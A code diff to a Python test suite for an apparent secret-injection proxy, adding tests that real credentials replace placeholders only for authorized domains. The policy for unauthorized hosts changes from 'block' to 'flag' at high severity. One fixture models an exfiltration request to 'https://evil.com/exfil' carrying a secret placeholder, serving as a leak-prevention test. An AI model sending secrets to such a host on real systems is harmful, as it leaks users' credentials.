@@ -83,7 +83,7 @@ class TestInjectRequest:
         inj.inject_request(flow)
         assert flow.request.url == "https://api.anthropic.com/v1?key=real-secret"
 
-    def test_blocks_placeholder_to_unauthorized_domain(self):
+    def test_flags_placeholder_to_unauthorized_domain(self):
         inj = _injector_with_rules([
             InjectionRule("KEY", "{{KEY}}", "real-secret", inject_to=["anthropic.com"]),
         ])
@@ -94,9 +94,37 @@ class TestInjectRequest:
         )
         result = inj.check_injection_policy(flow)
         assert result is not None
-        assert result.action == "block"
+        assert result.action == "flag"
+        assert result.severity == "high"
         assert "unauthorized" in result.reason
         assert "evil.com" in result.reason
+
+    def test_inject_skips_unauthorized_domain(self):
+        """Placeholder should be left in place for unauthorized domains."""
+        inj = _injector_with_rules([
+            InjectionRule("KEY", "{{KEY}}", "real-secret", inject_to=["anthropic.com"]),
+        ])
+        flow = _make_flow(
+            url="https://evil.com/exfil",
+            host="evil.com",
+            content="body with {{KEY}} here",
+        )
+        inj.inject_request(flow)
+        assert flow.request.content == b"body with {{KEY}} here"
+
+    def test_inject_mixed_rules(self):
+        """Authorized rule gets injected, unauthorized rule's placeholder stays."""
+        inj = _injector_with_rules([
+            InjectionRule("KEY", "{{KEY}}", "real-secret", inject_to=["anthropic.com"]),
+            InjectionRule("EMAIL", "{{EMAIL}}", "user@example.com", inject_to=["other.com"]),
+        ])
+        flow = _make_flow(
+            url="https://api.anthropic.com/v1/messages",
+            host="api.anthropic.com",
+            content="key={{KEY}}&email={{EMAIL}}",
+        )
+        inj.inject_request(flow)
+        assert flow.request.content == b"key=real-secret&email={{EMAIL}}"
 
     def test_no_inject_to_injects_everywhere(self):
         inj = _injector_with_rules([
